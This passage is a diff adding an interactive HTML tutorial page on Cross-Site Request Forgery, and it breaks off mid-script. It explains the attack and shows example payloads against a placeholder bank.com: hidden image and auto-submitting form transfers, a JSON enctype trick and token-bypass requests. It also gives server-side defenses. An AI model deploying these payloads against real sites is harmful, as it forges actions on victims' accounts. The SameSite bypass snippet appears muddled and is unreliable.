@@ -1,0 +1,719 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>CSRF</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,sans-serif;background:#0f0f11;color:#e2e2e6;padding:24px;line-height:1.6;font-size:14px}
+h1{font-size:22px;font-weight:500;margin-bottom:4px}
+.sub{color:#888;font-size:13px;margin-bottom:20px}
+.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:20px}
+.tab-btn{background:none;border:1px solid #2a2a30;padding:6px 16px;border-radius:8px;cursor:pointer;font-size:13px;color:#aaa;transition:all .15s}
+.tab-btn.active{background:#1e1e26;color:#e2e2e6;border-color:#555;font-weight:500}
+.tab-panel{display:none}.tab-panel.active{display:block}
+.code{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:12px;line-height:1.7;color:#aaa;white-space:pre-wrap;margin:8px 0;overflow-x:auto}
+.badge{display:inline-block;font-size:11px;padding:2px 8px;border-radius:6px;font-weight:500}
+.b-red{background:#3a1515;color:#f87171}
+.b-green{background:#0f2a1a;color:#4ade80}
+.b-amber{background:#2a1d0a;color:#fbbf24}
+.b-blue{background:#0d1f3a;color:#60a5fa}
+.b-purple{background:#1e1030;color:#c084fc}
+.b-teal{background:#0a2020;color:#2dd4bf}
+.result-box{padding:10px 14px;border-radius:8px;font-size:13px;line-height:1.6;margin-top:8px}
+.r-red{background:#2a1010;border:1px solid #5a2020;color:#f87171}
+.r-green{background:#0d2218;border:1px solid #1a4a30;color:#4ade80}
+.r-amber{background:#2a1c08;border:1px solid #5a3a10;color:#fbbf24}
+.fix-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px;border-left:3px solid #4ade80}
+.fix-card.danger{border-left-color:#f87171}
+.fix-card.warn{border-left-color:#fbbf24}
+.fix-card.info{border-left-color:#60a5fa}
+.sc-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px}
+.sc-red{border-left:3px solid #f87171}
+.sc-amber{border-left:3px solid #fbbf24}
+.sc-blue{border-left:3px solid #60a5fa}
+.sc-purple{border-left:3px solid #c084fc}
+.sc-teal{border-left:3px solid #2dd4bf}
+.step-row{display:flex;align-items:flex-start;gap:12px;padding:10px 0;border-bottom:1px solid #1e1e26}
+.step-row:last-child{border-bottom:none}
+.snum{min-width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;flex-shrink:0}
+.snum.d{background:#3a1515;color:#f87171}
+.snum.g{background:#0f2a1a;color:#4ade80}
+.snum.b{background:#0d1f3a;color:#60a5fa}
+.snum.p{background:#1e1030;color:#c084fc}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media(max-width:580px){.grid2{grid-template-columns:1fr}}
+input,select{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:7px 12px;color:#e2e2e6;font-size:13px;outline:none;transition:border .15s;font-family:'Courier New',monospace}
+input:focus,select:focus{border-color:#555}
+.mono-out{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:11px;line-height:1.7;min-height:110px;overflow:auto;color:#aaa;white-space:pre-wrap}
+.chip{font-size:11px;color:#666;margin-bottom:4px}
+.preset-btn{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:5px 12px;cursor:pointer;font-size:12px;color:#aaa;transition:all .15s}
+.preset-btn:hover{border-color:#555;color:#e2e2e6}
+.browser-bar{background:#1a1a22;border-radius:6px 6px 0 0;padding:6px 12px;font-size:11px;color:#888;border:1px solid #2a2a30;border-bottom:none;font-family:'Courier New',monospace}
+.browser-body{background:#13131a;border:1px solid #2a2a30;border-radius:0 0 6px 6px;padding:12px;font-size:12px;min-height:80px}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th{text-align:left;padding:8px 10px;font-weight:500;color:#888;border-bottom:1px solid #2a2a30}
+td{padding:8px 10px;border-bottom:1px solid #1e1e26;vertical-align:top}
+tr:last-child td{border-bottom:none}
+</style>
+</head>
+<body>
+
+<h1>Cross-Site Request Forgery (CSRF)</h1>
+<p class="sub">OWASP A01 Broken Access Control · CWE-352 · Force a logged-in user's browser to make unwanted requests to a site they're authenticated on</p>
+
+<div class="tabs">
+  <button class="tab-btn active" onclick="showTab('concept',this)">How it works</button>
+  <button class="tab-btn" onclick="showTab('demo',this)">Live demo</button>
+  <button class="tab-btn" onclick="showTab('types',this)">Attack types</button>
+  <button class="tab-btn" onclick="showTab('bypass',this)">Token bypasses</button>
+  <button class="tab-btn" onclick="showTab('samesite',this)">SameSite cookies</button>
+  <button class="tab-btn" onclick="showTab('fix',this)">Fixes</button>
+</div>
+
+<!-- CONCEPT -->
+<div class="tab-panel active" id="tab-concept">
+  <p style="font-size:13px;color:#888;margin-bottom:16px;">CSRF exploits the browser's automatic cookie sending. When a user is logged in to <code style="font-family:'Courier New',monospace;font-size:11px">bank.com</code>, their session cookie is attached to <em>every</em> request to that domain — even requests triggered by malicious code on a completely different site.</p>
+
+  <svg width="100%" viewBox="0 0 680 380" style="max-width:680px;display:block;margin:0 auto 16px;">
+    <defs>
+      <marker id="arr" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+      </marker>
+    </defs>
+
+    <!-- Victim browser -->
+    <rect x="230" y="20" width="220" height="160" rx="10" fill="#13131a" stroke="#60a5fa" stroke-width="0.8"/>
+    <text x="340" y="42" text-anchor="middle" font-size="12" font-weight="600" fill="#60a5fa" font-family="system-ui">Victim's browser</text>
+    <rect x="246" y="54" width="188" height="32" rx="5" fill="#0d1f3a" stroke="#60a5fa" stroke-width="0.5"/>
+    <text x="340" y="70" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="Courier New,monospace">Tab 1: bank.com</text>
+    <text x="340" y="84" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="Courier New,monospace">Session: logged in ✓</text>
+    <rect x="246" y="96" width="188" height="32" rx="5" fill="#2a1010" stroke="#f87171" stroke-width="0.5"/>
+    <text x="340" y="112" text-anchor="middle" font-size="10" fill="#f87171" font-family="Courier New,monospace">Tab 2: evil.com</text>
+    <text x="340" y="126" text-anchor="middle" font-size="10" fill="#f87171" font-family="Courier New,monospace">&lt;form action="bank.com/transfer"&gt;</text>
+    <rect x="246" y="140" width="188" height="28" rx="4" fill="#1e1030" stroke="#c084fc" stroke-width="0.5"/>
+    <text x="340" y="154" text-anchor="middle" font-size="10" fill="#c084fc" font-family="system-ui">Cookie jar: session=abc123</text>
+    <text x="340" y="166" text-anchor="middle" font-size="10" fill="#c084fc" font-family="system-ui" opacity="0.7">auto-attached to ALL bank.com requests</text>
+
+    <!-- Bank server -->
+    <rect x="490" y="80" width="170" height="80" rx="8" fill="#0f2a1a" stroke="#4ade80" stroke-width="0.8"/>
+    <text x="575" y="108" text-anchor="middle" font-size="12" font-weight="600" fill="#4ade80" font-family="system-ui">bank.com server</text>
+    <text x="575" y="126" text-anchor="middle" font-size="10" fill="#4ade80" font-family="system-ui">sees valid session</text>
+    <text x="575" y="142" text-anchor="middle" font-size="10" fill="#f87171" font-family="system-ui">executes transfer!</text>
+
+    <!-- Attacker site -->
+    <rect x="20" y="80" width="170" height="80" rx="8" fill="#2a1010" stroke="#f87171" stroke-width="0.8"/>
+    <text x="105" y="108" text-anchor="middle" font-size="12" font-weight="600" fill="#f87171" font-family="system-ui">evil.com</text>
+    <text x="105" y="126" text-anchor="middle" font-size="10" fill="#f87171" font-family="system-ui">hosts hidden form</text>
+    <text x="105" y="142" text-anchor="middle" font-size="10" fill="#f87171" font-family="Courier New,monospace">auto-submits on load</text>
+
+    <!-- Arrows -->
+    <line x1="192" y1="120" x2="228" y2="120" stroke="#f87171" stroke-width="1.2" marker-end="url(#arr)"/>
+    <rect x="193" y="105" width="34" height="13" rx="3" fill="#13131a"/>
+    <text x="210" y="113" text-anchor="middle" font-size="9" fill="#f87171" font-family="system-ui">visits</text>
+
+    <line x1="452" y1="120" x2="488" y2="120" stroke="#f87171" stroke-width="1.5" marker-end="url(#arr)"/>
+    <rect x="452" y="104" width="36" height="14" rx="3" fill="#13131a"/>
+    <text x="470" y="112" text-anchor="middle" font-size="9" fill="#f87171" font-family="system-ui">POST + 🍪</text>
+
+    <!-- What happens box -->
+    <rect x="20" y="214" width="640" height="146" rx="10" fill="#13131a" stroke="#2a2a30" stroke-width="0.8"/>
+    <text x="340" y="236" text-anchor="middle" font-size="12" font-weight="600" fill="#ccc" font-family="system-ui">The key insight — browser trust vs. server trust</text>
+
+    <rect x="36" y="250" width="284" height="96" rx="8" fill="#2a1010" stroke="#5a2020" stroke-width="0.8"/>
+    <text x="178" y="270" text-anchor="middle" font-size="11" font-weight="600" fill="#f87171" font-family="system-ui">What the browser does (automatic)</text>
+    <text x="52" y="289" font-size="10" fill="#888" font-family="system-ui">Any page can trigger a request to bank.com.</text>
+    <text x="52" y="305" font-size="10" fill="#888" font-family="system-ui">Browser attaches the session cookie.</text>
+    <text x="52" y="321" font-size="10" fill="#f87171" font-family="system-ui">The request looks identical to a</text>
+    <text x="52" y="337" font-size="10" fill="#f87171" font-family="system-ui">legitimate one from the victim.</text>
+
+    <rect x="360" y="250" width="284" height="96" rx="8" fill="#0f2a1a" stroke="#1a4a30" stroke-width="0.8"/>
+    <text x="502" y="270" text-anchor="middle" font-size="11" font-weight="600" fill="#4ade80" font-family="system-ui">What the server must verify</text>
+    <text x="376" y="289" font-size="10" fill="#888" font-family="system-ui">Did THIS page generate the request?</text>
+    <text x="376" y="305" font-size="10" fill="#888" font-family="system-ui">Check CSRF token — secret known only</text>
+    <text x="376" y="321" font-size="10" fill="#4ade80" font-family="system-ui">to this origin and this session.</text>
+    <text x="376" y="337" font-size="10" fill="#4ade80" font-family="system-ui">No token = no trust = reject.</text>
+  </svg>
+
+  <div style="background:#13131a;border-radius:8px;padding:12px;border:1px solid #2a2a30;">
+    <div style="font-size:13px;font-weight:600;color:#ccc;margin-bottom:6px;">CSRF vs XSS — critical difference</div>
+    <div class="grid2" style="gap:8px;">
+      <div style="background:#1a1a22;border-radius:6px;padding:8px 12px;">
+        <div style="font-size:11px;font-weight:600;color:#f87171;margin-bottom:4px;">CSRF</div>
+        <div style="font-size:11px;color:#888;">Forces the victim's browser to make a request. Attacker can't read the response (no same-origin access). Impact: state-changing actions on behalf of the victim.</div>
+      </div>
+      <div style="background:#1a1a22;border-radius:6px;padding:8px 12px;">
+        <div style="font-size:11px;font-weight:600;color:#fbbf24;margin-bottom:4px;">XSS</div>
+        <div style="font-size:11px;color:#888;">Executes arbitrary JS in the victim's browser context. Attacker CAN read responses, steal tokens, hijack sessions. Impact: full account takeover, data theft.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- LIVE DEMO -->
+<div class="tab-panel" id="tab-demo">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Simulate the victim's browser visiting an attacker's page while logged in to <code style="font-family:'Courier New',monospace;font-size:11px">bank.com</code>. Choose an attack scenario to see the forged request and whether it succeeds.</p>
+
+  <div style="margin-bottom:12px;">
+    <div class="chip">Attack scenario</div>
+    <select id="scenario-select" onchange="runDemo()" style="width:100%;font-family:system-ui;">
+      <option value="transfer">Bank transfer — GET-based CSRF</option>
+      <option value="transfer_post">Bank transfer — POST form (hidden)</option>
+      <option value="email_change">Change account email</option>
+      <option value="password">Change password</option>
+      <option value="admin">Admin action — add user</option>
+    </select>
+  </div>
+
+  <div style="margin-bottom:12px;">
+    <div class="chip">Malicious page source (what evil.com serves)</div>
+    <div class="mono-out" id="evil-source" style="min-height:90px;"></div>
+  </div>
+
+  <div class="grid2">
+    <div>
+      <div style="font-size:12px;font-weight:600;margin-bottom:4px;color:#f87171;">Request bank.com receives</div>
+      <div style="font-size:11px;color:#666;margin-bottom:6px;">(forged, but looks legitimate)</div>
+      <div class="mono-out" id="forged-req"></div>
+    </div>
+    <div>
+      <div style="font-size:12px;font-weight:600;margin-bottom:4px;color:#4ade80;">Bank server response</div>
+      <div class="grid2" style="gap:6px;margin-bottom:6px;">
+        <div style="font-size:11px;color:#f87171;">Vulnerable (no CSRF token)</div>
+        <div style="font-size:11px;color:#4ade80;">Protected (CSRF token)</div>
+      </div>
+      <div class="mono-out" id="server-resp"></div>
+    </div>
+  </div>
+  <div id="verdict" class="result-box" style="margin-top:10px;"></div>
+</div>
+
+<!-- ATTACK TYPES -->
+<div class="tab-panel" id="tab-types">
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">① GET-based CSRF — simplest</span><span class="badge b-red">High</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">Any state-changing GET endpoint is trivially exploitable — just embed the URL in an img src, link, or iframe. No form needed.</p>
+    <div class="code">&lt;!-- Victim visits evil.com, this loads automatically --&gt;
+&lt;img src="https://bank.com/transfer?to=attacker&amp;amount=10000" width="0" height="0"/&gt;
+
+&lt;!-- Or an iframe --&gt;
+&lt;iframe src="https://bank.com/transfer?to=attacker&amp;amount=10000" style="display:none"&gt;&lt;/iframe&gt;
+
+&lt;!-- Or a link the victim clicks --&gt;
+&lt;a href="https://bank.com/admin/delete-user?id=42"&gt;Click here to claim your prize!&lt;/a&gt;
+
+&lt;!-- Prevention: NEVER use GET for state-changing actions --&gt;</div>
+  </div>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">② POST-based CSRF — auto-submitting form</span><span class="badge b-red">High</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">A hidden form on the attacker's page auto-submits via JavaScript when the page loads. The browser sends the POST with the victim's session cookie attached.</p>
+    <div class="code">&lt;html&gt;
+&lt;body onload="document.forms[0].submit()"&gt;
+  &lt;form action="https://bank.com/transfer" method="POST" style="display:none"&gt;
+    &lt;input name="to"     value="attacker_account"/&gt;
+    &lt;input name="amount" value="10000"/&gt;
+    &lt;input name="currency" value="USD"/&gt;
+  &lt;/form&gt;
+  &lt;p&gt;Loading...&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!-- The victim sees a loading page for a split second
+     while $10,000 is transferred in the background --&gt;</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">③ JSON CSRF — Content-Type bypass</span><span class="badge b-amber">Medium</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">APIs that accept JSON but don't check CSRF tokens — some can be exploited if the server ignores <code style="font-family:'Courier New',monospace;font-size:11px">Content-Type</code>. A form with <code style="font-family:'Courier New',monospace;font-size:11px">enctype=text/plain</code> can craft a near-valid JSON body.</p>
+    <div class="code">&lt;!-- enctype=text/plain trick for JSON APIs --&gt;
+&lt;form action="https://api.bank.com/transfer"
+      method="POST"
+      enctype="text/plain"&gt;
+  &lt;input name='{"to":"attacker","amount":10000,"x"' value='"unused"}'&gt;
+&lt;/form&gt;
+&lt;!-- Body sent: {"to":"attacker","amount":10000,"x"="unused"} --&gt;
+&lt;!-- If server parses loosely, x field is ignored → CSRF via JSON --&gt;
+
+&lt;!-- Better: use fetch() with credentials if CORS allows it --&gt;
+fetch('https://bank.com/transfer', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({to:'attacker', amount:10000})
+})
+&lt;!-- Only works if bank.com CORS misconfigured with credentials:true --&gt;</div>
+  </div>
+
+  <div class="sc-card sc-purple">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">④ Stored CSRF — self-propagating</span><span class="badge b-purple">High</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">A CSRF payload stored in the application itself — e.g. in a forum post or user profile. Every user who views the page triggers the forged request automatically.</p>
+    <div class="code">&lt;!-- Stored in a forum post on bank.com's own forum --&gt;
+&lt;!-- Every logged-in user who views this post sends a transfer --&gt;
+&lt;img src="/transfer?to=attacker&amp;amount=100" width="0" height="0"/&gt;
+
+&lt;!-- Combined with stored XSS — the most dangerous form:
+     XSS reads the CSRF token → uses it to forge requests
+     → bypasses CSRF protection entirely --&gt;</div>
+  </div>
+</div>
+
+<!-- TOKEN BYPASSES -->
+<div class="tab-panel" id="tab-bypass">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Even when CSRF tokens are implemented, common mistakes leave them bypassable.</p>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">① Token not tied to the session</div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">If the server checks that a token exists and is valid but doesn't verify it belongs to <em>this session</em>, an attacker can use their own token in a CSRF attack.</p>
+    <div class="code">## Attacker logs in to the same app → gets their own CSRF token
+## Uses their own valid token in the forged request targeting the victim
+
+POST /transfer
+Cookie: session=VICTIM_SESSION
+csrf_token=ATTACKER_OWN_VALID_TOKEN   ← different session, same app
+to=attacker&amp;amount=10000
+
+## Vulnerable server: checks token is valid → passes!
+## Secure server: checks token belongs to this session → fails</div>
+  </div>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">② Token in URL (Referer leaks it)</div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">CSRF tokens in query strings get logged in server logs and leak via the Referer header to analytics/third-party scripts on subsequent pages.</p>
+    <div class="code">## Token in URL — leaks via Referer
+GET /transfer?csrf_token=secret123&amp;to=alice&amp;amount=100
+
+## Next request (to analytics):
+Referer: https://bank.com/transfer?csrf_token=secret123
+## Third-party server sees the token!
+
+## Fix: token in hidden form field or custom header only, never in URL</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">③ Missing token validation on some methods</div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">CSRF protection applied to POST but not PUT, PATCH, or DELETE. Switching the method bypasses the check.</p>
+    <div class="code">## POST is protected → switch to PUT
+PUT /api/user/email
+Cookie: session=abc123
+{"email": "attacker@evil.com"}
+## No CSRF check on PUT → succeeds
+
+## Or: method override via hidden field
+&lt;input name="_method" value="PUT"&gt;
+## Some frameworks honor this for CSRF-unprotected verbs</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">④ Token validation skipped when token absent</div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">The server validates the token if present, but if it's missing entirely — it skips validation. Just omit the token field.</p>
+    <div class="code">## With wrong token → rejected (validation runs, fails)
+POST /transfer
+csrf_token=WRONG&amp;to=attacker&amp;amount=10000
+→ 403 Forbidden
+
+## With NO token → accepted! (validation skipped)
+POST /transfer
+to=attacker&amp;amount=10000
+→ 200 OK  ← CSRF succeeds</div>
+  </div>
+
+  <div class="sc-card sc-purple">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">⑤ Referer-based CSRF protection bypass</div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">Some apps use the Referer header to check origin instead of a token. Easily bypassed by suppressing or spoofing the Referer.</p>
+    <div class="code">## Suppress Referer from attacker's page
+&lt;meta name="referrer" content="no-referrer"/&gt;
+&lt;!-- Browser sends no Referer header → server allows (fails open) --&gt;
+
+## Or link via HTTPS → HTTP (Referer stripped by spec)
+&lt;!-- Attacker on HTTPS site → links to HTTP bank.com
+     HTTPS→HTTP Referer is stripped by browser for security --&gt;
+
+## Spoof Referer with crafted URL
+https://attacker.com/bank.com?
+&lt;!-- Referer contains "bank.com" → naive check passes --&gt;</div>
+  </div>
+</div>
+
+<!-- SAMESITE COOKIES -->
+<div class="tab-panel" id="tab-samesite">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">The <code style="font-family:'Courier New',monospace;font-size:11px">SameSite</code> cookie attribute is the modern browser-level CSRF defense. It controls when cookies are sent on cross-site requests.</p>
+
+  <div style="overflow-x:auto;margin-bottom:12px;">
+    <table>
+      <thead>
+        <tr><th>SameSite value</th><th>Cross-site GET</th><th>Cross-site POST form</th><th>Cross-site XHR/fetch</th><th>CSRF protection</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td style="font-family:'Courier New',monospace;color:#f87171">None</td>
+          <td><span class="badge b-red">Cookie sent</span></td>
+          <td><span class="badge b-red">Cookie sent</span></td>
+          <td><span class="badge b-red">Cookie sent</span></td>
+          <td><span class="badge" style="background:#3a1515;color:#f87171">None — fully vulnerable</span></td>
+        </tr>
+        <tr>
+          <td style="font-family:'Courier New',monospace;color:#fbbf24">Lax</td>
+          <td><span class="badge b-amber">Sent (top-level nav)</span></td>
+          <td><span class="badge b-green">NOT sent</span></td>
+          <td><span class="badge b-green">NOT sent</span></td>
+          <td><span class="badge b-amber">Partial — POST protected, GET still vulnerable</span></td>
+        </tr>
+        <tr>
+          <td style="font-family:'Courier New',monospace;color:#4ade80">Strict</td>
+          <td><span class="badge b-green">NOT sent</span></td>
+          <td><span class="badge b-green">NOT sent</span></td>
+          <td><span class="badge b-green">NOT sent</span></td>
+          <td><span class="badge b-green">Full CSRF protection</span></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">SameSite=Lax bypass — the 2-minute window</div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">Chrome applies SameSite=Lax by default. But there's a 2-minute exception: cookies set without SameSite are sent on top-level cross-site GET requests for 2 minutes after being set. This is exploitable right after login.</p>
+    <div class="code">## Lax allows cookies on top-level cross-site GET navigation
+## So GET-based CSRF still works with SameSite=Lax:
+&lt;a href="https://bank.com/transfer?to=attacker&amp;amount=10000"&gt;Click&lt;/a&gt;
+&lt;!-- If victim clicks → GET request → cookie sent → CSRF succeeds --&gt;
+
+## Lax + POST bypass via window.open + form submit
+&lt;script&gt;
+  window.onclick = () =&gt; {
+    let w = window.open('https://bank.com/page'); // top-level nav — cookie sent
+    setTimeout(() =&gt; {
+      w.location = 'https://evil.com/csrf.html';  // now same window, POST it
+    }, 500);
+  }
+&lt;/script&gt;
+&lt;!-- Exploits browser state after top-level navigation --&gt;</div>
+  </div>
+
+  <div class="sc-card sc-purple">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Subdomain CSRF bypass — cookie scope</div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">If a session cookie is scoped to <code style="font-family:'Courier New',monospace;font-size:11px">.bank.com</code> (including subdomains), XSS on any subdomain — even <code style="font-family:'Courier New',monospace;font-size:11px">blog.bank.com</code> — can read CSRF tokens and forge requests.</p>
+    <div class="code">## Cookie with domain=.bank.com is readable from all subdomains
+## XSS on blog.bank.com can:
+## 1. Read the CSRF token via JS
+## 2. Make authenticated requests to bank.com with the valid token
+## → Full CSRF bypass even with tokens + SameSite=Strict
+
+## Defense: cookie scope must be exact domain, not .domain</div>
+  </div>
+</div>
+
+<!-- FIXES -->
+<div class="tab-panel" id="tab-fix">
+
+  <div class="fix-card danger">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">① CSRF tokens — synchronizer token pattern <span class="badge b-red">Primary defense</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Generate a cryptographically random token per session, embed it in every state-changing form, and verify it server-side on every non-GET request.</div>
+    <div class="code">## Python / Django (built-in)
+# In template:
+&lt;form method="POST"&gt;
+  {% csrf_token %}
+  &lt;input name="amount" value="100"/&gt;
+&lt;/form&gt;
+# Django verifies automatically — no extra code needed
+
+## Node.js / Express (csurf or csrf package)
+const csrf = require('csrf');
+const tokens = new csrf();
+const secret = await tokens.secret();
+const token = tokens.create(secret);
+// Store secret in session, embed token in form
+// On POST: tokens.verify(secret, req.body._csrf)
+
+## Ruby on Rails (built-in)
+# application_controller.rb
+protect_from_forgery with: :exception
+# Template: &lt;%= csrf_meta_tags %&gt; or &lt;%= form_with ... %&gt; (auto-included)
+
+## Key requirements:
+# - Random, unpredictable (≥128 bits)
+# - Tied to the specific session
+# - Validated on EVERY state-changing request
+# - Never in URL query string</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">② SameSite=Strict cookies <span class="badge b-green">Modern browser defense</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Set session cookies with <code style="font-family:'Courier New',monospace;font-size:11px">SameSite=Strict</code> — the browser refuses to send them on any cross-site request. Use alongside CSRF tokens, not instead.</div>
+    <div class="code">## Set-Cookie response header
+Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly; Path=/
+
+## Django
+SESSION_COOKIE_SAMESITE = 'Strict'
+SESSION_COOKIE_SECURE = True
+SESSION_COOKIE_HTTPONLY = True
+
+## Express / Node.js
+app.use(session({
+  cookie: {
+    sameSite: 'strict',
+    secure: true,
+    httpOnly: true
+  }
+}))
+
+## Why not Strict alone?
+## Breaks OAuth flows, email magic links, and any external link
+## that the user clicks to reach a page requiring login state.
+## Use Lax for those flows, Strict for session cookies.</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">③ Custom request headers (for AJAX / APIs) <span class="badge b-green">API defense</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Simple forms cannot set custom headers. If your API requires a custom header like <code style="font-family:'Courier New',monospace;font-size:11px">X-Requested-With: XMLHttpRequest</code>, cross-origin form POSTs are blocked by the browser's CORS preflight.</div>
+    <div class="code">## Server: require custom header on all state-changing API calls
+if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
+  return res.status(403).json({ error: 'CSRF: missing custom header' });
+}
+
+## Client: always include the header in AJAX calls
+fetch('/api/transfer', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    'X-Requested-With': 'XMLHttpRequest'  // ← CSRF defense
+  },
+  body: JSON.stringify({ to: 'alice', amount: 100 })
+})
+
+## Why this works: simple HTML forms cannot set custom headers.
+## Only fetch/XHR from the same origin (or CORS-allowed) can.
+## Cross-origin forms POST without this header → blocked.</div>
+  </div>
+
+  <div class="fix-card warn">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">④ Origin / Referer header validation <span class="badge b-amber">Defense in depth</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Check the <code style="font-family:'Courier New',monospace;font-size:11px">Origin</code> header (preferred over Referer — can't be suppressed by meta tag). Reject any request whose Origin doesn't match your site. Use as a secondary check alongside tokens.</div>
+    <div class="code">## Check Origin header (more reliable than Referer)
+const origin = req.headers['origin'];
+const allowed = ['https://bank.com', 'https://www.bank.com'];
+
+if (origin &amp;&amp; !allowed.includes(origin)) {
+  return res.status(403).json({ error: 'Invalid origin' });
+}
+// Note: if origin is absent (direct requests, same-origin), allow
+// if origin is present and NOT in allowlist, reject</div>
+  </div>
+
+  <div class="fix-card info">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">⑤ Checklist — always do all of these</div>
+    <div style="font-size:12px;color:#888;line-height:1.9;">
+      Never use GET for state-changing actions &nbsp;·&nbsp;
+      CSRF token in every form (hidden field), verified server-side &nbsp;·&nbsp;
+      Token tied to session, unpredictable, ≥128 bits &nbsp;·&nbsp;
+      SameSite=Strict on session cookies &nbsp;·&nbsp;
+      Validate all HTTP methods (not just POST) &nbsp;·&nbsp;
+      Reject requests when token is absent, not just when wrong &nbsp;·&nbsp;
+      Never put CSRF tokens in URLs
+    </div>
+  </div>
+</div>
+
+<script>
+function showTab(id,btn){
+  document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('tab-'+id).classList.add('active');
+  btn.classList.add('active');
+}
+
+const SCENARIOS={
+  transfer:{
+    label:'GET-based fund transfer',
+    evil:`&lt;!-- evil.com/win-prize.html --&gt;
+&lt;html&gt;&lt;body&gt;
+  &lt;h2&gt;Congratulations! You won!&lt;/h2&gt;
+
+  &lt;!-- This fires silently on page load --&gt;
+  &lt;img src="https://bank.com/transfer?to=attacker&amp;amount=5000"
+       width="1" height="1" style="display:none"/&gt;
+
+&lt;/body&gt;&lt;/html&gt;`,
+    req:`GET /transfer?to=attacker&amount=5000 HTTP/1.1
+Host: bank.com
+Cookie: session=VICTIM_SESSION_TOKEN  ← auto-attached!
+Referer: https://evil.com/win-prize.html`,
+    vuln:`HTTP 200 OK
+
+{
+  "status": "success",
+  "message": "Transfer complete",
+  "from": "victim",
+  "to": "attacker",
+  "amount": 5000,
+  "currency": "USD"
+}`,
+    safe:`HTTP 405 Method Not Allowed
+
+{
+  "error": "State-changing actions require POST",
+  "note": "GET requests are read-only"
+}`,
+    verdict:'<strong>GET-based CSRF exploited!</strong> The victim loaded evil.com and the 1×1 invisible image triggered a fund transfer. The bank executed it — the session cookie was automatically attached. The secure server rejects GET for state-changing actions.'
+  },
+  transfer_post:{
+    label:'POST form — hidden auto-submit',
+    evil:`&lt;!-- evil.com/loading.html --&gt;
+&lt;html&gt;
